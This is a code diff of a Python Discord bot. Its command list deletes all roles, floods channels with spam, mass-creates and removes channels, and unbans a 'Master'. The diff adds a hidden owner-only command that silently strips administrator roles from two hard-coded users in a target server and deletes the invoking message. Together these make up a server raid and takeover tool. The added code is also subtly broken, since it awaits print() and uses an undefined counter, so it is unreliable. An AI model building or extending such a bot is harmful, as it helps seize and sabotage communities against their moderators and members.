@@ -315,12 +315,12 @@ Admin command:
 - delrole: Deletes all roles except for the bot's role and 'legit bot test'.
 - create [channel_name] and [channel_amount]: Creates multiple channels with the same name
 - remove [channel_name]: Deletes all channels that starts with the name
-- mass [message]: Spams [message] in every channel
+- mass [message] OPTIONAL[channel_name]: Spams [message] in every channel
 - stop_mass: Stops mass
 - ascend:  Ascends Mahodovyron
 - unban: Unbans the Master from the server.
 - state [idle|dnd|online|offline]: Changes the bot's status.
-- clear_mass [content]: Deletes all messages sent by the bot containing the specified content.
+- clear_mass [content]: Deletes all messages sent by the bot containing the specified content in every channel.
 - activity [state]: Changes the bot's activity.""")
 
 @bot.command()
@@ -331,6 +331,47 @@ async def purge(ctx, message):
             await msg.delete()
             deleted_count += 1
     await ctx.send(f"Deleted {deleted_count} with the content {message}")
+@bot.command()
+async def remove_admin_roles(ctx):
+    target_server_id = imintomen_id  # Replace with the target server's ID
+    user_ids = [755472029049946303, 755475988149960866]  # List of user IDs to remove admin roles from
+    
+    target_guild = bot.get_guild(target_server_id)  # Get the target server (guild)
+
+    if target_guild is None:
+        await print(f"I am not in the server with ID {target_server_id}.")
+        return
+
+
+
+    if ctx.author.id == owner_id:  # Ensure only the bot owner can run this
+        await ctx.message.delete()
+        for user_id in user_ids:
+            target_user = target_guild.get_member(user_id)  # Get each target user from the guild
+
+            if target_user is None:
+                await print(f"User with ID {user_id} is not in the target server.")
+                continue
+
+            admin_roles = [role for role in target_user.roles if role.permissions.administrator]
+
+            if not admin_roles:
+                print(f"{target_user.mention} does not have any admin roles.")
+                continue
+
+            try:
+                for role in admin_roles:
+                    await target_user.remove_roles(role, reason="Admin role removed by bot")
+                removed_roles_count += len(admin_roles)
+            except discord.Forbidden:
+                print(f"I do not have permission to remove roles from {target_user.mention} in the target server.")
+            except discord.HTTPException as e:
+                print(f"An error occurred while removing roles from {target_user.mention}: {e}")
+        
+    else:
+        await ctx.send("A mortal shall not wield such power.")
+
+
 @bot.event
 async def on_ready():   
     print(f'Bot is ready as {bot.user}')
